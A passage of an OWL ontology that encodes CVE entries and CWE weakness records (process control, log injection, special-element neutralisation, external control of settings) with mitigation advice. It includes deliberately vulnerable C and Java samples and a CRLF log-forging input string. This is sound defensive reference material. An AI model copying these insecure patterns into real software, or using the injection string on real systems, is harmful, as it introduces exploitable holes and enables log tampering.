        rdfs:comment "The Jenkins CLI subsystem in Jenkins before 1.638 and LTS before 1.625.2 allows remote attackers to execute arbitrary code via a crafted serialized Java object, related to a problematic webapps/ROOT/WEB-INF/lib/commons-collections-*.jar file and the \"Groovy variant in 'ysoserial'\"."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2016-2402

    Annotations: 
        rdfs:comment "OkHttp before 2.7.4 and 3.x before 3.1.2 allows man-in-the-middle attackers to bypass certificate pinning by sending a certificate chain with a certificate from a non-pinned trusted CA and the pinned certificate."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2017-11508

    Annotations: 
        rdfs:comment "SecurityCenter versions 5.5.0, 5.5.1 and 5.5.2 contain a SQL Injection vulnerability that could be exploited by an authenticated user with sufficient privileges to run diagnostic scans. An attacker could exploit this vulnerability by entering a crafted SQL query into the password field of a diagnostic scan within SecurityCenter. Successful exploitation of this vulnerability could allow an attacker to gain unauthorized access."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2017-9764

    Annotations: 
        rdfs:comment "Cross-site scripting (XSS) vulnerability in MetInfo 5.3.17 allows remote attackers to inject arbitrary web script or HTML via the Client-IP or X-Forwarded-For HTTP header to /include/stat/stat.php in a para action."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CWE-1008_Architectural_Concepts

    Annotations: 
        rdfs:comment "Software designers may find this view useful as the weaknesses are organized by known security tactics, aiding the designer in embedding security throughout the design process instead of discovering weaknesses after the software has been built."^^xsd:string,
        rdfs:comment "The top level categories in this view represent the individual tactics that are part of a secure-by-design approach to software development. The weaknesses that are members of each category contain information about how each is introduced relative to the software's architecture. Three different modes of introduction are used: Omission - caused by missing a security tactic when it is necessary. Commission - refers to incorrect choice of tactics which could result in undesirable consequences. Realization - appropriate security tactics are adopted but are incorrectly implemented."^^xsd:string,
        rdfs:comment "This view organizes weaknesses according to common architectural security tactics. It is intended to assist architects in identifying potential mistakes that can be made when designing software."^^xsd:string
    
    Types: 
        Views
    
    Facts:  
     ID  "1008"^^xsd:positiveInteger
    
    
Individual: CWE-1009_Audit

    Annotations: 
        rdfs:comment "Weaknesses in this category are related to the design and architecture of audit-based components of the system. Frequently these deal with logging user activities in order to identify attackers and modifications to the system. The weaknesses in this category could lead to a degradation of the quality of the audit capability if they are not addressed when designing or implementing a secure architecture."^^xsd:string
    
    Types: 
        Categories
    
    Facts:  
     views_member  CWE-1008_Architectural_Concepts,
     ID  "1009"^^xsd:positiveInteger
    
    
Individual: CWE-1010_Authenticate_Actors

    Annotations: 
        rdfs:comment "Weaknesses in this category are related to the design and architecture of authentication components of the system. Frequently these deal with verifying the entity is indeed who it claims to be. The weaknesses in this category could lead to a degradation of the quality of authentication if they are not addressed when designing or implementing a secure architecture."^^xsd:string
    
    Types: 
        Categories
    
    Facts:  
     views_member  CWE-1008_Architectural_Concepts,
     ID  "1010"^^xsd:positiveInteger
    
    
Individual: CWE-1011_Authorize_Actors

    Annotations: 
        rdfs:comment "Weaknesses in this category are related to the design and architecture of a system's authorization components. Frequently these deal with enforcing that agents have the required permissions before performing certain operations, such as modifying data. The weaknesses in this category could lead to a degredation of quality of the authorization capability if they are not addressed when designing or implementing a secure architecture."^^xsd:string
    
    Types: 
        Categories
    
    Facts:  
     views_member  CWE-1008_Architectural_Concepts,
     ID  "1011"^^xsd:positiveInteger
    
    
Individual: CWE-1012_Cross_Cutting

    Annotations: 
        rdfs:comment "Weaknesses in this category are related to the design and architecture of multiple security tactics and how they affect a system. For example, information exposure can impact the Limit Access and Limit Exposure security tactics. The weaknesses in this category could lead to a degradation of the quality of many capabilities if they are not addressed when designing or implementing a secure architecture."^^xsd:string
    
    Types: 
        Categories
    
    Facts:  
     views_member  CWE-1008_Architectural_Concepts,
     ID  "1012"^^xsd:positiveInteger
    
    
Individual: CWE-1013_Encrypt_Data

    Annotations: 
        rdfs:comment "Weaknesses in this category are related to the design and architecture of data confidentiality in a system. Frequently these deal with the use of encryption libraries. The weaknesses in this category could lead to a degradation of the quality data encyprtion if they are not addressed when designing or implementing a secure architecture."^^xsd:string
    
    Types: 
        Categories
    
    Facts:  
     views_member  CWE-1008_Architectural_Concepts,
     ID  "1013"^^xsd:positiveInteger
    
    
Individual: CWE-1014_Identify_Actors

    Annotations: 
        rdfs:comment "Weaknesses in this category are related to the design and architecture of a system's identification management components. Frequently these deal with verifying that external agents provide inputs into the system. The weaknesses in this category could lead to a degradation of the quality of identification maangment if they are not addressed when designing or implementing a secure architecture."^^xsd:string
    
    Types: 
        Categories
    
    Facts:  
     views_member  CWE-1008_Architectural_Concepts,
     ID  "1014"^^xsd:positiveInteger
    
    
Individual: CWE-1015_Limit_Access

    Annotations: 
        rdfs:comment "Weaknesses in this category are related to the design and architecture of system resources. Frequently these deal with restricting the amount of resources that are accessed by actors, such as memory, network connections, CPU or access points. The weaknesses in this category could lead to a degradation of the quality of authentication if they are not addressed when designing or implementing a secure architecture."^^xsd:string
    
    Types: 
        Categories
    
    Facts:  
     views_member  CWE-1008_Architectural_Concepts,
     ID  "1015"^^xsd:positiveInteger
    
    
Individual: CWE-1016_Limit_Exposure

    Annotations: 
        rdfs:comment "Weaknesses in this category are related to the design and architecture of the entry points to a system. Frequently these deal with minimizing the attack surface through designing the system with the least needed amount of entry points. The weaknesses in this category could lead to a degradation of a system's defenses if they are not addressed when designing or implementing a secure architecture."^^xsd:string
    
    Types: 
        Categories
    
    Facts:  
     views_member  CWE-1008_Architectural_Concepts,
     ID  "1016"^^xsd:positiveInteger
    
    
Individual: CWE-1017_Lock_Computer

    Annotations: 
        rdfs:comment "Weaknesses in this category are related to the design and architecture of a system's lockout mechanism. Frequently these deal with scenarios that take effect in case of multiple failed attempts to access a given resource. The weaknesses in this category could lead to a degradation of access to system assets if they are not addressed when designing or implementing a secure architecture."^^xsd:string
    
    Types: 
        Categories
    
    Facts:  
     views_member  CWE-1008_Architectural_Concepts,
     ID  "1017"^^xsd:positiveInteger
    
    
Individual: CWE-1018_Manage_User_Sessions

    Annotations: 
        rdfs:comment "Weaknesses in this category are related to the design and architecture of session managment. Frequently these deal with the information or status about each user and their access rights for the duration of multiple requests. The weaknesses in this category could lead to a degradation of the quality of session managment if they are not addressed when designing or implementing a secure architecture."^^xsd:string
    
    Types: 
        Categories
    
    Facts:  
     views_member  CWE-1008_Architectural_Concepts,
     ID  "1018"^^xsd:positiveInteger
    
    
Individual: CWE-1019_Validate_Inputs

    Annotations: 
        rdfs:comment "Weaknesses in this category are related to the design and architecture of a system's input validation components. Frequently these deal with sanitizing, neutralizing and validating any externally provided inputs to minimize malformed data from entering the system and preventing code injection in the input data. The weaknesses in this category could lead to a degradation of the quality of data flow in a system if they are not addressed when designing or implementing a secure architecture."^^xsd:string
    
    Types: 
        Categories
    
    Facts:  
     views_member  CWE-1008_Architectural_Concepts,
     ID  "1019"^^xsd:positiveInteger
    
    
Individual: CWE-1020_Verify_Message_Integrity

    Annotations: 
        rdfs:comment "Weaknesses in this category are related to the design and architecture of a system's data integrity components. Frequently these deal with ensuring integrity of data, such as messages, resource files, deployment files, and configuration files. The weaknesses in this category could lead to a degradation of data integrity quality if they are not addressed when designing or implementing a secure architecture."^^xsd:string
    
    Types: 
        Categories
    
    Facts:  
     views_member  CWE-1008_Architectural_Concepts,
     ID  "1020"^^xsd:positiveInteger
    
    
Individual: CWE-114_Process_Control

    Annotations: 
        rdfs:comment "Affected Resources: System Process"^^xsd:string,
        rdfs:comment "Executing commands or loading libraries from an untrusted source or in an untrusted environment can cause an application to execute malicious commands (and payloads) on behalf of an attacker."^^xsd:string,
        rdfs:comment "Process control vulnerabilities take two forms: 1. An attacker can change the command that the program executes: the attacker explicitly controls what the command is. 2. An attacker can change the environment in which the command executes: the attacker implicitly controls what the command means. Process control vulnerabilities of the first type occur when either data enters the application from an untrusted source and the data is used as part of a string representing a command that is executed by the application. By executing the command, the application gives an attacker a privilege or capability that the attacker would not otherwise have."^^xsd:string
    
    Types: 
        Bases
    
    Facts:  
     categories_member  CWE-1011_Authorize_Actors,
     
     Annotations: rdfs:comment "Command Line Execution through SQL Injection"^^xsd:string
                 
                 related_attack_patterns  CAPEC-108,
     ID  "114"^^xsd:positiveInteger,
     
     Annotations: rdfs:comment "The listings below show possible areas for which the given weakness could appear. These may be for specific named Languages, Operating Systems, Architectures,  Paradigms, Technologies, or a class of such platforms. The platform is listed along with how frequently the given weakness appears for that instance."^^xsd:string
                 
                 applicable_platforms  ""^^xsd:string,
     
     Annotations: rdfs:comment "Strategy: Libraries or Frameworks

Libraries that are loaded should be well understood and come from a trusted source. The application can execute code contained in the native libraries, which often contain calls that are susceptible to other security problems, such as buffer overflows or command injection. All native libraries should be validated to determine if the application requires the use of the library. It is very difficult to determine what these native libraries actually do, and the potential for malicious code is high. In addition, the potential for an inadvertent mistake in these native libraries is also high, as many are written in C or C++ and may be susceptible to buffer overflow or race condition problems. To help prevent buffer overflow attacks, validate all input to native calls for content and length. If the native library does not come from a trusted source, review the source code of the library. The library should be built from the reviewed source before using it."^^xsd:string
                 
                 architecture_and_design  "",
     availability  "Execute Unauthorized Code or Commands"^^xsd:string,
     class  "Language-Independent"^^xsd:string,
     
     Annotations: rdfs:comment "The table below specifies different individual consequences associated with the weakness. The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     confidentiality  "Execute Unauthorized Code or Commands"^^xsd:string,
     
     Annotations: rdfs:comment "Example 1
The following code uses System.loadLibrary() to load code from a native library named library.dll, which is normally found in a standard system directory.
Example Language: Java  /* (bad code) */
...
System.loadLibrary(\"library.dll\");
...
The problem here is that System.loadLibrary() accepts a library name, not a path, for the library to be loaded. From the Java 1.4.2 API documentation this function behaves as follows [1]: A file containing native code is loaded from the local file system from a place where library files are conventionally obtained. The details of this process are implementation-dependent. The mapping from a library name to a specific filename is done in a system-specific manner. If an attacker is able to place a malicious copy of library.dll higher in the search order than file the application intends to load, then the application will load the malicious copy instead of the intended file. Because of the nature of the application, it runs with elevated privileges, which means the contents of the attacker's library.dll will now be run with elevated privileges, possibly giving them complete control of the system."^^xsd:string, 
                 rdfs:comment "Example 2
The following code from a privileged application uses a registry entry to determine the directory in which it is installed and loads a library file based on a relative path from the specified directory.
Example Language: C   /* (bad code) */
...
RegQueryValueEx(hkey, \"APPHOME\",
0, 0, (BYTE*)home, &size);
char* lib=(char*)malloc(strlen(home)+strlen(INITLIB));
if (lib) {

strcpy(lib,home);
strcat(lib,INITCMD);
LoadLibrary(lib);
}
...
The code in this example allows an attacker to load an arbitrary library, from which code will be executed with the elevated privilege of the application, by modifying a registry key to specify a different path containing a malicious version of INITLIB. Because the program does not validate the value read from the environment, if an attacker can control the value of APPHOME, they can fool the application into running malicious code."^^xsd:string, 
                 rdfs:comment "Example 3
The following code is from a web-based administration utility that allows users access to an interface through which they can update their profile on the system. The utility makes use of a library named liberty.dll, which is normally found in a standard system directory.
Example Language: C   /* (bad code) */
LoadLibrary(\"liberty.dll\");
The problem is that the program does not specify an absolute path for liberty.dll. If an attacker is able to place a malicious library named liberty.dll higher in the search order than file the application intends to load, then the application will load the malicious copy instead of the intended file. Because of the nature of the application, it runs with elevated privileges, which means the contents of the attacker's liberty.dll will now be run with elevated privileges, possibly giving the attacker complete control of the system. The type of attack seen in this example is made possible because of the search order used by LoadLibrary() when an absolute path is not specified. If the current directory is searched before system directories, as was the case up until the most recent versions of Windows, then this type of attack becomes trivial if the attacker can execute the program locally. The search order is operating system version dependent, and is controlled on newer operating systems by the value of the registry key: HKLM\\System\\CurrentControlSet\\Control\\Session Manager\\SafeDllSearchMode"^^xsd:string
                 
                 demonstrative_examples  "",
     
     Annotations: rdfs:comment "REALIZATION: This weakness is caused during implementation of an architectural security tactic."^^xsd:string
                 
                 implementation  ""^^xsd:string,
     integrity  "Execute Unauthorized Code or Commands"^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string
    
    
Individual: CWE-117_Improper_Output_Neutralization_for_Logs

    Annotations: 
        rdfs:comment "Applications typically use log files to store a history of events or transactions for later review, statistics gathering, or debugging. Depending on the nature of the application, the task of reviewing log files may be performed manually on an as-needed basis or automated with a tool that automatically culls logs for important events or trending information."^^xsd:string,
        rdfs:comment "The software does not neutralize or incorrectly neutralizes output that is written to logs."^^xsd:string,
        rdfs:comment "This can allow an attacker to forge log entries or inject malicious content into logs.
Log forging vulnerabilities occur when:
1. Data enters an application from an untrusted source.
2. The data is written to an application or system log file."^^xsd:string
    
    Types: 
        Bases
    
    Facts:  
     categories_member  CWE-1009_Audit,
     
     Annotations: rdfs:comment "CRLF injection vulnerability in Utils.py in Mailman before 2.1.9rc1 allows remote attackers to spoof messages in the error log and possibly trick the administrator into visiting malicious URLs via CRLF sequences in the URI."^^xsd:string
                 
                 references  CVE-2006-4624,
     related_attack_patterns  CAPEC-81,
     related_attack_patterns  CAPEC-93,
     ID  "117"^^xsd:positiveInteger,
     
     Annotations: rdfs:comment "The listings below show possible areas for which the given weakness could appear. These may be for specific named Languages, Operating Systems, Architectures, Paradigms, Technologies, or a class of such platforms. The platform is listed along with how frequently the given weakness appears for that instance."^^xsd:string
                 
                 applicable_platforms  ""^^xsd:string,
     availability  "Execute Unauthorized Code or Commands"^^xsd:string,
     availability  "Hide Activities"^^xsd:string,
     availability  "Modify Application Data"^^xsd:string,
     class  "Language-Independent"^^xsd:string,
     
     Annotations: rdfs:comment "Interpretation of the log files may be hindered or misdirected if an attacker can supply data to the application that is subsequently logged verbatim. In the most benign case, an attacker may be able to insert false entries into the log file by providing the application with input that includes appropriate characters. Forged or otherwise corrupted log files can be used to cover an attacker's tracks, possibly by skewing statistics, or even to implicate another party in the commission of a malicious act. If the log file is processed automatically, the attacker can render the file unusable by corrupting the format of the file or injecting unexpected characters. An attacker may inject code or other commands into the log file and take advantage of a vulnerability in the log processing utility."^^xsd:string, 
                 rdfs:comment "The table below specifies different individual consequences associated with the weakness. The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     confidentiality  "Execute Unauthorized Code or Commands"^^xsd:string,
     confidentiality  "Hide Activities"^^xsd:string,
     confidentiality  "Modify Application Data"^^xsd:string,
     
     Annotations: rdfs:comment "Example 1

The following web application code attempts to read an integer value from a request object. If the parseInt call fails, then the input is logged with an error message indicating what happened.

(bad code)
Example Language: Java 
String val = request.getParameter(\"val\");
try {

int value = Integer.parseInt(val);
}
catch (NumberFormatException) {
log.info(\"Failed to parse val = \" + val);
}
...
If a user submits the string \"twenty-one\" for val, the following entry is logged:

INFO: Failed to parse val=twenty-one
However, if an attacker submits the string \"twenty-one%0a%0aINFO:+User+logged+out%3dbadguy\", the following entry is logged:

INFO: Failed to parse val=twenty-one
INFO: User logged out=badguy
Clearly, attackers can use this same mechanism to insert arbitrary log entries."^^xsd:string
                 
                 demonstrative_examples  "",
     
     Annotations: rdfs:comment "REALIZATION: This weakness is caused during implementation of an architectural security tactic."^^xsd:string, 
                 rdfs:comment "Strategy: Input Validation

Assume all input is malicious. Use an \"accept known good\" input validation strategy, i.e., use a whitelist of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.
When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, \"boat\" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as \"red\" or \"blue.\"
Do not rely exclusively on looking for malicious or malformed inputs (i.e., do not rely on a blacklist). A blacklist is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, blacklists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright."^^xsd:string, 
                 rdfs:comment "Strategy: Input Validation

Inputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass whitelist validation schemes by introducing dangerous inputs after they have been checked."^^xsd:string, 
                 rdfs:comment "Strategy: Output Encoding

Use and specify an output encoding that can be handled by the downstream component that is reading the output. Common encodings include ISO-8859-1, UTF-7, and UTF-8. When an encoding is not specified, a downstream component may choose a different encoding, either by assuming a default encoding or automatically inferring which encoding is being used, which can be erroneous. When the encodings are inconsistent, the downstream component might treat some character or byte sequences as special, even if they are not special in the original encoding. Attackers might then be able to exploit this discrepancy and conduct injection attacks; they even might be able to bypass protection mechanisms that assume the original encoding is also being used by the downstream component."^^xsd:string
                 
                 implementation  ""^^xsd:string,
     integrity  "Execute Unauthorized Code or Commands"^^xsd:string,
     integrity  "Hide Activities"^^xsd:string,
     integrity  "Modify Application Data"^^xsd:string,
     likelihood_of_exploit  "Medium"^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string,
     non-repudiation  "Execute Unauthorized Code or Commands"^^xsd:string,
     non-repudiation  "Hide Activities"^^xsd:string,
     non-repudiation  "Modify Application Data"^^xsd:string,
     weakness_ordinalities  "Primary"^^xsd:string
    
    
Individual: CWE-138_Improper_Neutralization_of_Special_Elements

    Annotations: 
        rdfs:comment "Most languages and protocols have their own special elements such as characters and reserved words. These special elements can carry control implications. If software does not prevent external control or influence over the inclusion of such special elements, the control flow of the program may be altered from what was intended. For example, both Unix and Windows interpret the symbol < (\"less than\") as meaning \"read input from a file\"."^^xsd:string,
        rdfs:comment "Relationship:
See this entry's children for different types of special elements that have been observed at one point or another. However, it can be difficult to find suitable CVE examples. In an attempt to be complete, CWE includes some types that do not have any associated observed example."^^xsd:string,
        rdfs:comment "Relationship:
This weakness can be related to interpretation conflicts or interaction errors in intermediaries (such as proxies or application firewalls) when the intermediary's model of an endpoint does not account for protocol-specific special elements."^^xsd:string,
        rdfs:comment "Research Gap:
This weakness is probably under-studied for proprietary or custom formats. It is likely that these issues are fairly common in applications that use their own custom format for configuration files, logs, meta-data, messaging, etc. They would only be found by accident or with a focused effort based on an understanding of the format."^^xsd:string,
        rdfs:comment "The software receives input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could be interpreted as control elements or syntactic markers when they are sent to a downstream component."^^xsd:string
    
    Types: 
        Classes
    
    Facts:  
     categories_member  CWE-1019_Validate_Inputs,
     
     Annotations: rdfs:comment "Setuid program does not cleanse special escape sequence before sending data to a mail program, causing the mail program to process those sequences."^^xsd:string
                 
                 references  CVE-2000-0703,
     
     Annotations: rdfs:comment "Read arbitrary files from mail client by providing a special MIME header that is internally used to store pathnames for attachments."^^xsd:string
                 
                 references  CVE-2001-0677,
     
     Annotations: rdfs:comment "Multi-channel issue. Terminal escape sequences not filtered from log files."^^xsd:string
                 
                 references  CVE-2003-0020,
     
     Annotations: rdfs:comment "Multi-channel issue. Terminal escape sequences not filtered from log files."^^xsd:string
                 
                 references  CVE-2003-0083,
     
     Annotations: rdfs:comment "Command Delimiters"^^xsd:string
                 
                 related_attack_patterns  CAPEC-15,
     ID  "138"^^xsd:positiveInteger,
     
     Annotations: rdfs:comment "The listings below show possible areas for which the given weakness could appear. These may be for specific named Languages, Operating Systems, Architectures, Paradigms, Technologies, or a class of such platforms. The platform is listed along with how frequently the given weakness appears for that instance."^^xsd:string
                 
                 applicable_platforms  ""^^xsd:string,
     availability  "Alter Execution Logic"^^xsd:string,
     availability  "DoS: Crash, Exit, or Restart"^^xsd:string,
     availability  "Execute Unauthorized Code or Commands"^^xsd:string,
     
     Annotations: rdfs:comment "The table below specifies different individual consequences associated with the weakness. The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     confidentiality  "Alter Execution Logic"^^xsd:string,
     confidentiality  "DoS: Crash, Exit, or Restart"^^xsd:string,
     confidentiality  "Execute Unauthorized Code or Commands"^^xsd:string,
     
     Annotations: rdfs:comment "Developers should anticipate that special elements (e.g. delimiters, symbols) will be injected into input vectors of their software system. One defense is to create a whitelist (e.g. a regular expression) that defines valid input according to the requirements specifications. Strictly filter any input that does not match against the whitelist. Properly encode your output, and quote any elements that have special meaning to the component with which you are communicating."^^xsd:string, 
                 rdfs:comment "REALIZATION: This weakness is caused during implementation of an architectural security tactic."^^xsd:string, 
                 rdfs:comment "Strategy: Input Validation

Assume all input is malicious. Use an \"accept known good\" input validation strategy, i.e., use a whitelist of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.
When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, \"boat\" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as \"red\" or \"blue.\"
Do not rely exclusively on looking for malicious or malformed inputs (i.e., do not rely on a blacklist). A blacklist is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, blacklists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright."^^xsd:string, 
                 rdfs:comment "Strategy: Input Validation

Inputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass whitelist validation schemes by introducing dangerous inputs after they have been checked."^^xsd:string, 
                 rdfs:comment "Strategy: Output Encoding

While it is risky to use dynamically-generated query strings, code, or commands that mix control and data together, sometimes it may be unavoidable. Properly quote arguments and escape any special characters within those arguments. The most conservative approach is to escape or filter all characters that do not pass an extremely strict whitelist (such as everything that is not alphanumeric or white space). If some special characters are still needed, such as white space, wrap each argument in quotes after the escaping/filtering step. Be careful of argument injection (CWE-88)."^^xsd:string, 
                 rdfs:comment "Use and specify an appropriate output encoding to ensure that the special elements are well-defined. A normal byte sequence in one encoding could be a special element in another."^^xsd:string
                 
                 implementation  ""^^xsd:string,
     integrity  "Alter Execution Logic"^^xsd:string,
     integrity  "DoS: Crash, Exit, or Restart"^^xsd:string,
     integrity  "Execute Unauthorized Code or Commands"^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string,
     other  "Alter Execution Logic"^^xsd:string,
     other  "DoS: Crash, Exit, or Restart"^^xsd:string,
     other  "Execute Unauthorized Code or Commands"^^xsd:string,
     weakness_ordinalities  "Primary"^^xsd:string
    
    
Individual: CWE-150_Improper_Neutralization_of_Escape_Meta_or_Control_Sequences

    Annotations: 
        rdfs:comment "As data is parsed, an injected/absent/malformed delimiter may cause the process to take unexpected actions."^^xsd:string,
        rdfs:comment "The software receives input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could be interpreted as escape, meta, or control character sequences when they are sent to a downstream component."^^xsd:string
    
    Types: 
        Variants
    
    Facts:  
     categories_member  CWE-1019_Validate_Inputs,
     references  CVE-2000-0476,
     references  CVE-2000-0703,
     references  CVE-2001-1556,
     
     Annotations: rdfs:comment "The mail program processes special \"~\" escape sequence even when not in interactive mode."^^xsd:string
                 
                 references  CVE-2002-0542,
     references  CVE-2002-0986,
     references  CVE-2003-0020,
     references  CVE-2003-0021,
     references  CVE-2003-0022,
     references  CVE-2003-0023,
     references  CVE-2003-0063,
     references  CVE-2003-0083,
     related_attack_patterns  CAPEC-134,
     related_attack_patterns  CAPEC-41,
     related_attack_patterns  CAPEC-81,
     related_attack_patterns  CAPEC-93,
     ID  "150"^^xsd:positiveInteger,
     
     Annotations: rdfs:comment "The listings below show possible areas for which the given weakness could appear. These may be for specific named Languages, Operating Systems, Architectures, Paradigms, Technologies, or a class of such platforms. The platform is listed along with how frequently the given weakness appears for that instance."^^xsd:string
                 
                 applicable_platforms  ""^^xsd:string,
     
     Annotations: rdfs:comment "The table below specifies different individual consequences associated with the weakness. The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     
     Annotations: rdfs:comment "REALIZATION: This weakness is caused during implementation of an architectural security tactic."^^xsd:string
                 
                 implementation  ""^^xsd:string,
     integrity  "Unexpected State"^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string
    
    
Individual: CWE-15_External_Control_of_System_or_Configuration_Setting

    Annotations: 
        rdfs:comment "Allowing external control of system settings can disrupt service or cause an application to behave in unexpected, and potentially malicious ways."^^xsd:string,
        rdfs:comment "One or more system settings or configuration elements can be externally controlled by a user."^^xsd:string
    
    Types: 
        Bases
    
    Facts:  
     categories_member  CWE-1011_Authorize_Actors,
     
     Annotations: rdfs:comment "Subverting Environment Variable Values"^^xsd:string
                 
                 related_attack_patterns  CAPEC-13,
     
     Annotations: rdfs:comment "XML Schema Poisoning"^^xsd:string
                 
                 related_attack_patterns  CAPEC-146,
     
     Annotations: rdfs:comment "Manipulate Registry Information"^^xsd:string
                 
                 related_attack_patterns  CAPEC-203,
     
     Annotations: rdfs:comment "Schema Poisoning"^^xsd:string
                 
                 related_attack_patterns  CAPEC-271,
     
     Annotations: rdfs:comment "Target Programs with Elevated Privileges"^^xsd:string
                 
                 related_attack_patterns  CAPEC-69,
     
     Annotations: rdfs:comment "Manipulating Web Input to File System Calls"^^xsd:string
                 
                 related_attack_patterns  CAPEC-76,
     
     Annotations: rdfs:comment "Manipulating User-Controlled Variables"^^xsd:string
                 
                 related_attack_patterns  CAPEC-77,
     ID  "15"^^xsd:positiveInteger,
     
     Annotations: rdfs:comment "Because setting manipulation covers a diverse set of functions, any attempt at illustrating it will inevitably be incomplete. Rather than searching for a tight-knit relationship between the functions addressed in the setting manipulation category, take a step back and consider the sorts of system values that an attacker should not be allowed to control."^^xsd:string, 
                 rdfs:comment "In general, do not allow user-provided or otherwise untrusted data to control sensitive values. The leverage that an attacker gains by controlling these values is not always immediately obvious, but do not underestimate the creativity of the attacker."^^xsd:string, 
                 rdfs:comment "Strategy: Separation of Privilege
Compartmentalize the system to have \"safe\" areas where trust boundaries can be unambiguously drawn. Do not allow sensitive data to go outside of the trust boundary and always be careful when interfacing with a compartment outside of the safe area.
Ensure that appropriate compartmentalization is built into the system design and that the compartmentalization serves to allow for and further reinforce privilege separation functionality. Architects and designers should rely on the principle of least privilege to decide when it is appropriate to use and to drop system privileges."^^xsd:string
                 
                 architecture_and_design  "",
     
     Annotations: rdfs:comment "The table below specifies different individual consequences associated with the weakness. The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     
     Annotations: rdfs:comment "Example 2
The following Java code snippet reads a string from an HttpServletRequest and sets it as the active catalog for a database Connection.
 Example Language: Java  /* (bad code) */
...
conn.setCatalog(request.getParameter(\"catalog\"));
...
In this example, an attacker could cause an error by providing a nonexistent catalog name or connect to an unauthorized portion of the database."^^xsd:string, 
                 rdfs:comment "The following C code accepts a number as one of its command line parameters and sets it as the host ID of the current machine.
  Example Language: C  /* (bad code) */
...
sethostid(argv[1]);
...
Although a process must be privileged to successfully invoke sethostid(), unprivileged users may be able to invoke the program. The code in this example allows user input to directly control the value of a system setting. If an attacker provides a malicious value for host ID, the attacker can misidentify the affected machine on the network or cause other unintended behavior."^^xsd:string
                 
                 demonstrative_examples  "",
     
     Annotations: rdfs:comment "Because setting manipulation covers a diverse set of functions, any attempt at illustrating it will inevitably be incomplete. Rather than searching for a tight-knit relationship between the functions addressed in the setting manipulation category, take a step back and consider the sorts of system values that an attacker should not be allowed to control."^^xsd:string, 
                 rdfs:comment "In general, do not allow user-provided or otherwise untrusted data to control sensitive values. The leverage that an attacker gains by controlling these values is not always immediately obvious, but do not underestimate the creativity of the attacker."^^xsd:string, 
                 rdfs:comment "REALIZATION: This weakness is caused during implementation of an architectural security tactic."^^xsd:string, 
                 rdfs:comment "Setting manipulation vulnerabilities occur when an attacker can control values that govern the behavior of the system, manage specific resources, or in some way affect the functionality of the application."^^xsd:string
                 
                 implementation  ""^^xsd:string,
     
